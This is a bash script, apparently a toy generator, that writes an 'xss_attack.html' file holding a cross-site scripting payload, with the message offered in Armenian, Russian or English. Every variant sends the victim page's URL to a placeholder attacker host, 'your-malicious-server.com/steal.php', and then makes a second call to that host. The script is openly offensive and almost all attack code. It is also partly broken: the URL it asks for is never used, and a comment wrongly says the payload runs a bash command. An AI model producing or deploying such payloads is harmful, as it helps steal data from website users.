#!/bin/bash

read -p "Enter the website URL: " url

echo "Select your language option:"
echo "1. Armenian"
echo "2. Russian"
echo "3. English"
read -p "Enter your language option (1-3): " lang_option

if [ "$lang_option" = "1" ]; then
    xss_script="<script>
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://your-malicious-server.com/steal.php?url=' + encodeURIComponent(url), true);
    xhr.send();

    // Read the URL and execute a bash command
    var cmd = 'echo \"Ես մենք մեծ հաքույր հակավարիչ եմ!\"';
    var script = document.createElement('script');
    script.innerHTML = 'new Image().src=\"https://your-malicious-server.com/collect.php?cmd=' + encodeURIComponent(cmd) + '\"';
    document.body.appendChild(script);
    </script>"
elif [ "$lang_option" = "2" ]; then
    xss_script="<script>
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://your-malicious-server.com/steal.php?url=' + encodeURIComponent(url), true);
    xhr.send();

    // Read the URL and execute a bash command
    var cmd = 'echo \"Я злобный хакер!\"';
    var script = document.createElement('script');
    script.innerHTML = 'new Image().src=\"https://your-malicious-server.com/collect.php?cmd=' + encodeURIComponent(cmd) + '\"';
    document.body.appendChild(script);
    </script>"
else
    xss_script="<script>
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://your-malicious-server.com/steal.php?url=' + encodeURIComponent(url), true);
    xhr.send();

    // Read the URL and execute a bash command
    var cmd = 'echo \"I am an evil hacker!\"';
    var script = document.createElement('script');
    script.innerHTML = 'new Image().src=\"https://your-malicious-server.com/collect.php?cmd=' + encodeURIComponent(cmd) + '\"';
    document.body.appendChild(script);
    </script>"
fi

bash_command="echo \"$xss_script\" > xss_attack.html"

eval $bash_command

echo "XSS attack script has been generated successfully!"